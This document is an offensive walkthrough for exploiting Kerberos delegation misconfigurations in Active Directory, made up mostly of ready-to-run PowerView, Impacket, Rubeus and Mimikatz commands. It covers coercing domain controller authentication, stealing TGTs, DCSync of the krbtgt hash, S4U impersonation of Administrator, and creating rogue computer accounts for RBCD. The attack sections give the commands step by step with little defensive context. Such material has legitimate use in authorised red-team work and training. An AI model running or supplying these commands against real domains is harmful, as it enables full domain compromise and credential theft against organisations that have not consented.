# Delegation Attacks Walkthrough

Step-by-step guide for exploiting Kerberos delegation misconfigurations in Active Directory.

## Part 1: Enumerating Delegation

### Find Unconstrained Delegation

Unconstrained delegation allows a service to impersonate users to ANY other service.

```powershell
# PowerView - Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | Select-Object dnshostname, samaccountname

# Filter out Domain Controllers (they have it by default)
Get-DomainComputer -Unconstrained | Where-Object { $_.distinguishedname -notlike "*Domain Controllers*" }

# Find users with unconstrained delegation (rare but possible)
Get-DomainUser -TrustedForDelegation
```

```bash
# Impacket - findDelegation.py
findDelegation.py domain.local/user:password -dc-ip 192.168.1.10

# ldapsearch
ldapsearch -x -H ldap://dc01.domain.local -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
  sAMAccountName dNSHostName
```

```cypher
# BloodHound Query
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name CONTAINS 'DC'
RETURN c.name
```

### Find Constrained Delegation

Constrained delegation limits which services an account can impersonate users to.

```powershell
# PowerView - Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto

# All constrained delegation
Get-DomainObject -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
```

```bash
# Impacket - findDelegation.py shows all types
findDelegation.py domain.local/user:password -dc-ip 192.168.1.10

# ldapsearch for constrained delegation
ldapsearch -x -H ldap://dc01.domain.local -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo
```

```cypher
# BloodHound Query
MATCH (u)-[:AllowedToDelegate]->(c:Computer)
RETURN u.name, c.name
```

### Find RBCD Configurations

Resource-Based Constrained Delegation is configured on the target, not the source.

```powershell
# PowerView - Check who can delegate TO a computer
Get-DomainComputer ws01 | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity

# Decode the security descriptor
$computer = Get-DomainComputer ws01 -Properties msds-allowedtoactonbehalfofotheridentity
$descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $computer.'msds-allowedtoactonbehalfofotheridentity', 0
$descriptor.DiscretionaryAcl | ForEach-Object {
    $sid = $_.SecurityIdentifier
    (New-Object System.Security.Principal.SecurityIdentifier $sid).Translate([System.Security.Principal.NTAccount])
}
```

```bash
# ldapsearch for RBCD
ldapsearch -x -H ldap://dc01.domain.local -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
  sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Identify RBCD Attack Opportunities

Look for write permissions on computer objects:

```powershell
# PowerView - Find where you have write permissions on computers
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ObjectType -match "computer" -and
    ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty")
}

# Check specific computer
Get-DomainObjectAcl ws01 -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty"
}
```

```cypher
# BloodHound - Find RBCD attack paths
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteProperty]->(c:Computer)
RETURN p

# Or through group membership
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)-[:GenericAll|GenericWrite|WriteProperty]->(c:Computer)
RETURN p
```

---

## Part 2: Unconstrained Delegation Attack

### Scenario
You've compromised a server (WEB01) that has unconstrained delegation. Any user who authenticates to WEB01 will have their TGT cached.

### Step 1: Confirm Unconstrained Delegation

```powershell
# On compromised server, verify delegation
Get-DomainComputer WEB01 | Select-Object useraccountcontrol
# Should show TRUSTED_FOR_DELEGATION (524288)
```

### Step 2: Monitor for TGTs

```powershell
# Mimikatz - Export all tickets periodically
mimikatz # sekurlsa::tickets /export

# Rubeus - Monitor for TGTs in real-time
.\Rubeus.exe monitor /interval:5 /filteruser:administrator
.\Rubeus.exe monitor /interval:5 /targetuser:DC01$
```

### Step 3: Coerce Authentication (Optional)

If you can't wait for natural authentication, coerce it:

```bash
# PrinterBug - Coerce DC to authenticate to your compromised server
# Requires: SpoolService running on DC (default)
printerbug.py domain.local/user:password@dc01.domain.local web01.domain.local

# PetitPotam - Coerce via MS-EFSRPC (may work unauthenticated on older DCs)
petitpotam.py web01.domain.local dc01.domain.local
petitpotam.py -u user -p password -d domain.local web01.domain.local dc01.domain.local

# Coercer - Multiple coercion methods
coercer coerce -u user -p password -d domain.local -t dc01.domain.local -l web01.domain.local
```

### Step 4: Capture the TGT

```powershell
# After authentication is coerced, extract the TGT
mimikatz # sekurlsa::tickets /export
# Look for: [0;XXXXX]-2-0-40e10000-DC01$@krbtgt-DOMAIN.LOCAL.kirbi

# Or with Rubeus
.\Rubeus.exe dump /user:DC01$ /nowrap
```

### Step 5: Use the TGT

```powershell
# Mimikatz - Inject the TGT
mimikatz # kerberos::ptt [0;xxxxx]-2-0-40e10000-DC01$@krbtgt-DOMAIN.LOCAL.kirbi

# DCSync with DC's TGT
mimikatz # lsadump::dcsync /user:krbtgt /domain:domain.local
```

```bash
# Linux - Convert and use
ticketConverter.py dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache

# DCSync with DC machine account
secretsdump.py -k -no-pass domain.local/DC01\$@dc01.domain.local
```

---

## Part 3: Constrained Delegation Attack

### Scenario
You've compromised a service account (svc_sql) that has constrained delegation to MSSQL/DB01.domain.local.

### Step 1: Verify Delegation Configuration

```powershell
# Check what services the account can delegate to
Get-DomainUser svc_sql | Select-Object samaccountname, msds-allowedtodelegateto

# Example output:
# samaccountname  : svc_sql
# msds-allowedtodelegateto : {MSSQLSvc/DB01.domain.local:1433}
```

### Step 2: Get TGT for the Service Account

```bash
# Using password
getTGT.py domain.local/svc_sql:password -dc-ip 192.168.1.10

# Using NTLM hash
getTGT.py domain.local/svc_sql -hashes :NTLM_HASH -dc-ip 192.168.1.10

# Using AES key
getTGT.py domain.local/svc_sql -aesKey AES256_KEY -dc-ip 192.168.1.10

# Export
export KRB5CCNAME=svc_sql.ccache
```

### Step 3: Perform S4U Attack

```bash
# Request service ticket for Administrator to MSSQL service
getST.py -spn MSSQLSvc/DB01.domain.local:1433 -impersonate Administrator \
  domain.local/svc_sql:password -dc-ip 192.168.1.10

# Output: Administrator.ccache
export KRB5CCNAME=Administrator.ccache

# Connect to SQL Server as Administrator
mssqlclient.py -k -no-pass domain.local/Administrator@DB01.domain.local
```

```powershell
# Using Rubeus
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLM_HASH /impersonateuser:Administrator \
  /msdsspn:MSSQLSvc/DB01.domain.local:1433 /ptt

# Or with AES key
.\Rubeus.exe s4u /user:svc_sql /aes256:AES_KEY /impersonateuser:Administrator \
  /msdsspn:MSSQLSvc/DB01.domain.local:1433 /ptt
```

### Alternative Services Trick

The service name in the ticket (sname) can be changed! If you can delegate to any service on a host, you can access OTHER services.

```bash
# Constrained delegation to MSSQLSvc, but we want CIFS (file shares)
getST.py -spn MSSQLSvc/DB01.domain.local:1433 -impersonate Administrator \
  domain.local/svc_sql:password -dc-ip 192.168.1.10 -altservice CIFS/DB01.domain.local

export KRB5CCNAME=Administrator.ccache

# Access file shares
smbclient //DB01.domain.local/c$ -k -no-pass

# Or get shell
psexec.py -k -no-pass domain.local/Administrator@DB01.domain.local
```

```powershell
# Rubeus - Alternative service
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLM_HASH /impersonateuser:Administrator \
  /msdsspn:MSSQLSvc/DB01.domain.local:1433 /altservice:CIFS /ptt

# Now access file share
dir \\DB01.domain.local\c$
```

---

## Part 4: Resource-Based Constrained Delegation (RBCD)

### Scenario
You have GenericWrite on a computer WS01. You want to compromise it using RBCD.

### Step 1: Verify Write Permissions

```powershell
# Check your permissions on target
$sid = (Get-DomainUser currentuser).objectsid
Get-DomainObjectAcl WS01 -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -eq $sid }

# Or check ACLs for your user
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -eq "currentuser" }
```

### Step 2: Create a Computer Account

By default, any domain user can create up to 10 computer accounts (ms-DS-MachineAccountQuota).

```bash
# Using Impacket addcomputer.py
addcomputer.py -computer-name 'FAKECOMP$' -computer-pass 'Password123!' \
  domain.local/user:password -dc-ip 192.168.1.10

# Verify creation
Get-DomainComputer FAKECOMP
```

```powershell
# Using PowerMad
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKECOMP -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Using RSAT
New-ADComputer -Name "FAKECOMP" -SamAccountName "FAKECOMP$" -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Enabled $true
```

### Step 3: Configure RBCD on Target

```powershell
# Get SID of our fake computer
$fakeSid = (Get-DomainComputer FAKECOMP).objectsid

# Create security descriptor allowing FAKECOMP to delegate
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakeSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Set RBCD on target computer
Get-DomainComputer WS01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Verify
Get-DomainComputer WS01 -Properties msds-allowedtoactonbehalfofotheridentity
```

```bash
# Using rbcd.py (Impacket)
rbcd.py -delegate-to 'WS01$' -delegate-from 'FAKECOMP$' -action write \
  domain.local/user:password -dc-ip 192.168.1.10

# Using rbcd_permissions.py
python3 rbcd_permissions.py -t WS01 -d domain.local -u user -p password --add FAKECOMP
```

### Step 4: Perform S4U Attack

```bash
# Get TGT for fake computer
getTGT.py domain.local/'FAKECOMP$':'Password123!' -dc-ip 192.168.1.10
export KRB5CCNAME=FAKECOMP\$.ccache

# S4U to get ticket for Administrator to WS01
getST.py -spn CIFS/WS01.domain.local -impersonate Administrator \
  domain.local/'FAKECOMP$':'Password123!' -dc-ip 192.168.1.10

export KRB5CCNAME=Administrator.ccache

# Access target
psexec.py -k -no-pass domain.local/Administrator@WS01.domain.local
smbclient //WS01.domain.local/c$ -k -no-pass
```

```powershell
# Using Rubeus
.\Rubeus.exe hash /password:Password123! /user:FAKECOMP$ /domain:domain.local
# Note the rc4_hmac (NTLM) or aes256_cts_hmac_sha1

.\Rubeus.exe s4u /user:FAKECOMP$ /rc4:NTLM_HASH /impersonateuser:Administrator \
  /msdsspn:CIFS/WS01.domain.local /ptt

# Access target
dir \\WS01.domain.local\c$
```

### Step 5: Cleanup (Optional)

```powershell
# Remove RBCD configuration
Set-DomainObject WS01 -Clear 'msds-allowedtoactonbehalfofotheridentity'

# Delete fake computer
Remove-ADComputer -Identity FAKECOMP
```

```bash
# Using rbcd.py
rbcd.py -delegate-to 'WS01$' -delegate-from 'FAKECOMP$' -action remove \
  domain.local/user:password -dc-ip 192.168.1.10
```

---

## Part 5: Advanced Scenarios

### Constrained Delegation with Protocol Transition

If "Use any authentication protocol" is enabled (TRUSTED_TO_AUTH_FOR_DELEGATION):

```powershell
# Check for protocol transition
Get-DomainUser -TrustedToAuth | Where-Object {
    $_.useraccountcontrol -band 0x1000000
}
```

With protocol transition, S4U2Self tickets are forwardable, making the attack more straightforward.

### Shadow Credentials + RBCD

If you can write to msDS-KeyCredentialLink, you can obtain credentials:

```bash
# Add shadow credential
pywhisker -d domain.local -u user -p password --target WS01$ --action add

# Use obtained certificate for authentication
# Then proceed with RBCD attack
```

### Cross-Domain RBCD

RBCD can work across trusts:

```bash
# From child domain, target parent domain computer
# Create computer in child domain
addcomputer.py -computer-name 'FAKECOMP$' -computer-pass 'Password123!' \
  child.domain.local/user:password

# Configure RBCD on parent domain target (if you have write access)
# S4U with cross-domain referrals
getST.py -spn CIFS/TARGET.parent.domain.local -impersonate Administrator \
  child.domain.local/'FAKECOMP$':'Password123!' -dc-ip parent_dc_ip
```

---

## Troubleshooting

### Common Errors

**KDC_ERR_BADOPTION**
```bash
# S4U2Proxy failed - likely not allowed to delegate
# Check msDS-AllowedToDelegateTo or RBCD configuration
```

**S4U2Self ticket not forwardable**
```bash
# For RBCD, ticket doesn't need to be forwardable
# For constrained delegation, check if TRUSTED_TO_AUTH_FOR_DELEGATION is set
```

**Target user is protected**
```bash
# Protected Users group members cannot be impersonated
# "Account is sensitive and cannot be delegated" flag is set
# Try different target user
```

**Clock skew**
```bash
sudo ntpdate dc01.domain.local
```

---

## Quick Reference

### Enumeration
```powershell
Get-DomainComputer -Unconstrained                # Unconstrained delegation
Get-DomainUser -TrustedToAuth                    # Constrained delegation
Get-DomainComputer -TrustedToAuth                # Constrained delegation
```

### Unconstrained Delegation
```
1. Compromise computer with TrustedForDelegation
2. Coerce authentication: printerbug.py, petitpotam.py
3. Capture TGT: Rubeus monitor, Mimikatz sekurlsa::tickets
4. Use TGT: kerberos::ptt or export KRB5CCNAME
```

### Constrained Delegation
```bash
getST.py -spn SERVICE/TARGET -impersonate Administrator domain/svc:pass
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain/Administrator@TARGET
```

### RBCD
```bash
addcomputer.py -computer-name 'FAKE$' -computer-pass 'Pass!' domain/user:pass
rbcd.py -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write domain/user:pass
getST.py -spn CIFS/TARGET -impersonate Administrator domain/'FAKE$':'Pass!'
psexec.py -k -no-pass domain/Administrator@TARGET
```
